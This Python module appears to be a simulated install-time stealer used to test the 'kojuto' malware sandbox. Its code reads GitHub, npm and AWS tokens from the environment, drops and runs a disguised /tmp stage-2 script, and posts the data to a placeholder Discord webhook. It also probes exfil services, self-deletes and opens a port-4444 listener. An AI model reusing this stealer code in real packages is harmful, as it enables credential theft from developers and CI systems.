"""
Install-phase payload — executed by setup.py PostInstall hook.

This module is invoked via `python3 -c "import nk_stealer_demo.payload"`
which triggers kojuto's code_execution detection (inline exec flag).

TTPs exercised:
  - Stage-2 dropper to /tmp (code_execution: suspicious exec dir)
  - Discord webhook exfil (data_exfiltration: NEW)
  - pastebin.com exfil (data_exfiltration: NEW)
  - Persistence via .bashrc (persistence: OLD)
  - Self-deletion of stage-2 (anti-forensics — currently unmonitored)
"""

import os
import sys
import socket
import struct
import subprocess
import tempfile


def _drop_stage2():
    """Drop stage-2 payload to /tmp and execute — triggers code_execution.

    Two detection paths:
    1. execve from /tmp/ (suspicious exec dir)
    2. python3 -c inline execution (interpreter exec flag)
    """
    stage2_path = "/tmp/.ld-linux-x86-64.py"
    stage2_code = '''
import socket, os, json

# Collect system info (recon)
info = {
    "hostname": os.uname().nodename,
    "user": os.environ.get("USER", "unknown"),
    "ci": os.environ.get("CI", "false"),
    "github_token": os.environ.get("GITHUB_TOKEN", ""),
    "npm_token": os.environ.get("NPM_TOKEN", ""),
    "aws_key": os.environ.get("AWS_ACCESS_KEY_ID", ""),
}

# Exfil to Discord webhook — triggers data_exfiltration (NEW)
try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(2)
    sock.connect(("discord.com", 443))
    payload = json.dumps({"content": str(info)}).encode()
    sock.sendall(
        b"POST /api/webhooks/000000000000000000/FAKE HTTP/1.1\\r\\n"
        b"Host: discord.com\\r\\n"
        b"Content-Type: application/json\\r\\n"
        b"Content-Length: " + str(len(payload)).encode() + b"\\r\\n"
        b"\\r\\n" + payload
    )
    sock.close()
except Exception:
    pass

# Exfil to Pastebin — triggers data_exfiltration (NEW)
try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(2)
    sock.connect(("pastebin.com", 443))
    sock.close()
except Exception:
    pass

# Self-delete (anti-forensics — currently unmonitored by kojuto)
try:
    os.unlink(__file__)
except Exception:
    pass
'''

    # Write stage-2 payload
    try:
        with open(stage2_path, "w") as f:
            f.write(stage2_code)
        os.chmod(stage2_path, 0o755)

        # Execute from /tmp — triggers code_execution (suspicious exec dir)
        subprocess.Popen(
            [sys.executable, stage2_path],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
    except Exception:
        pass


def _dns_resolve_exfil_services():
    """Force DNS resolution of exfil services — triggers data_exfiltration (NEW).

    Even if connect() fails (sandbox blocks it), the DNS query to port 53
    is captured by kojuto's sendto monitor.
    """
    services = [
        ("discord.com", 443),
        ("api.telegram.org", 443),
        ("pastebin.com", 443),
        ("webhook.site", 443),
        ("transfer.sh", 443),
        ("ipinfo.io", 443),
    ]

    for host, port in services:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.connect((host, port))
            sock.close()
        except Exception:
            pass


def _backdoor_listener():
    """Bind + listen — triggers backdoor detection (OLD)."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind(("0.0.0.0", 4444))
        sock.listen(1)
        # Don't actually accept — just demonstrate the detection
        sock.close()
    except Exception:
        pass


# ============================================================
# Main execution
# ============================================================

# Resolve exfil services (DNS queries captured even if connect fails)
_dns_resolve_exfil_services()

# Drop and execute stage-2 from /tmp
_drop_stage2()

# Open backdoor listener
_backdoor_listener()
